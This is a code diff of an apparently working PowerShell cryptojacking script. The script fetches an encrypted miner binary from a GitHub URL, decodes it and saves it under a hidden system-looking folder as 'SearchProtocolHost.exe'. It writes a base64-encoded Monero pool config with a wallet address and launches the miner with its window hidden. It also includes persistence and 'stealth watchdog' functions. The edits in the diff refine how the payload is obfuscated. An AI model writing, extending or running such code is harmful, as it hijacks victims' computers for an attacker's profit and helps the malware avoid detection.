@@ -61,11 +61,9 @@ $dec=XorDec $enc $key
 }
 
 function Write-MinerConfig{
-$p=(X $_u)
-$pl=(X $_p)
-$pb=(X $_pb)
-$cfg='{"api-mode":null,"donate-level":0,"donate-over-proxy":0,"log-file":null,"print-time":60,"health-print-time":60,"retries":5,"retry-pause":5,"syslog":false,"watch":true,"opencl-platform":-1,"algo":"rx/0","coins":"monero","pools":[{"url":"' + $pl + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null},{"url":"' + $pb + '","user":"' + $p + '","keepalive":true,"tls":true,"tls-fingerprint":null}],"cpu":true}'
-$cfg|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
+$cb64='eyJhcGktbW9kZSI6bnVsbCwiZG9uYXRlLWxldmVsIjowLCJkb25hdGUtb3Zlci1wcm94eSI6MCwibG9nLWZpbGUiOm51bGwsInByaW50LXRpbWUiOjYwLCJoZWFsdGgtcHJpbnQtdGltZSI6NjAsInJldHJpZXMiOjUsInJldHJ5LXBhdXNlIjo1LCJzeXNsb2ciOmZhbHNlLCJ3YXRjaCI6dHJ1ZSwib3BlbmNsLXBsYXRmb3JtIjotMSwiYWxnbyI6InJ4LzAiLCJjb2lucyI6Im1vbmVybyIsInBvb2xzIjpbeyJ1cmwiOiJwb29sLmhhc2h2YXVsdC5wcm86NDQzIiwidXNlciI6IjQ2N2cxbWVpekZlMzFHekZNRzd4b3kzeXhUaEc1NnA3Tk56dXRLZmY3WVBpMURhZEFkcmtZMnhMajl6TFdqWk5tNGhmWG9GMnV4YTZQZ0pDV1FjNlFVaDY0TkdwWEVMIiwia2VlcGFsaXZlIjp0cnVlLCJ0bHMiOnRydWUsInRscy1maW5nZXJwcmludCI6bnVsbH0seyJ1cmwiOiJwb29sLnN1cHBvcnR4bXIuY29tOjQ0MyIsInVzZXIiOiI0NjdnMW1laXpGZTMxR3pGTUc3eG95M3l4VGhHNTZwN05OenV0S2ZmN1lQaTFEYWRBZHJrWTJ4TGo5ekxXalpObTRoZlhvRjJ1eGE2UGdKQ1dRYzZRVWg2NE5HcFhFTCIsImtlZXBhbGl2ZSI6dHJ1ZSwidGxzIjp0cnVlLCJ0bHMtZmluZ2VycHJpbnQiOm51bGx9XSwiY3B1Ijp0cnVlfQ=='
+$json=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cb64))
+$json|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
 }
 
 function Set-Persistence{
@@ -90,7 +88,7 @@ $s.Save()
 }
 
 function Write-StealthWatchdog{
-$w="# watchdog"
+$w='# watchdog'
 $w+='
 `$ErrorActionPreference=''SilentlyContinue'''
 $w+='
@@ -125,10 +123,6 @@ function XorDec([byte[]]`$d,[byte[]]`$k){`$o=New-Object byte[] `$d.Length;for(`$
 $m+='
 `$wc=New-Object Net.WebClient'
 $m+='
-`$enc=`$wc.DownloadData((X ''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==''))'
-$m+='
-`$dec=XorDec `$enc `$k'
-$m+='
 `$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"'
 $m+='
 `$_m="SearchProtocolHost.exe"'
@@ -137,17 +131,17 @@ if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}'
 $m+='
 Set-ItemProperty `$_s -Name Attributes -Value ''Hidden,System'' -ErrorAction SilentlyContinue'
 $m+='
+`$enc=`$wc.DownloadData((X ''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==''))'
+$m+='
+`$dec=XorDec `$enc `$k'
+$m+='
 [System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)'
 $m+='
-`$p=(X ''NTY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='')'
+`$cb64=''eyJhcGktbW9kZSI6bnVsbCwiZG9uYXRlLWxldmVsIjowLCJkb25hdGUtb3Zlci1wcm94eSI6MCwibG9nLWZpbGUiOm51bGwsInByaW50LXRpbWUiOjYwLCJoZWFsdGgtcHJpbnQtdGltZSI6NjAsInJldHJpZXMiOjUsInJldHJ5LXBhdXNlIjo1LCJzeXNsb2ciOmZhbHNlLCJ3YXRjaCI6dHJ1ZSwib3BlbmNsLXBsYXRmb3JtIjotMSwiYWxnbyI6InJ4LzAiLCJjb2lucyI6Im1vbmVybyIsInBvb2xzIjpbeyJ1cmwiOiJwb29sLmhhc2h2YXVsdC5wcm86NDQzIiwidXNlciI6IjQ2N2cxbWVpekZlMzFHekZNRzd4b3kzeXhUaEc1NnA3Tk56dXRLZmY3WVBpMURhZEFkcmtZMnhMajl6TFdqWk5tNGhmWG9GMnV4YTZQZ0pDV1FjNlFVaDY0TkdwWEVMIiwia2VlcGFsaXZlIjp0cnVlLCJ0bHMiOnRydWUsInRscy1maW5nZXJwcmludCI6bnVsbH0seyJ1cmwiOiJwb29sLnN1cHBvcnR4bXIuY29tOjQ0MyIsInVzZXIiOiI0NjdnMW1laXpGZTMxR3pGTUc3eG95M3l4VGhHNTZwN05OenV0S2ZmN1lQaTFEYWRBZHJrWTJ4TGo5ekxXalpObTRoZlhvRjJ1eGE2UGdKQ1dRYzZRVWg2NE5HcFhFTCIsImtlZXBhbGl2ZSI6dHJ1ZSwidGxzIjp0cnVlLCJ0bHMtZmluZ2VycHJpbnQiOm51bGx9XSwiY3B1Ijp0cnVlfQ=='''
 $m+='
-`$pl=(X ''cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='')'
+`$json=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$cb64))'
 $m+='
-`$pb=(X ''cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='')'
-$m+='
-`$cfg=''{''''api-mode'''':null,''''donate-level'''':0,''''pools'''':[{''''url'''':""'' + $pl + ''","'''user'''':""'' + $p + ''","'''keepalive'''':true,''''tls'''':true}],''''cpu'''':true}'''
-$m+='
-`$cfg|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
+`$json|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
 $m+='
 Start-Process -FilePath "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden'
 $m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
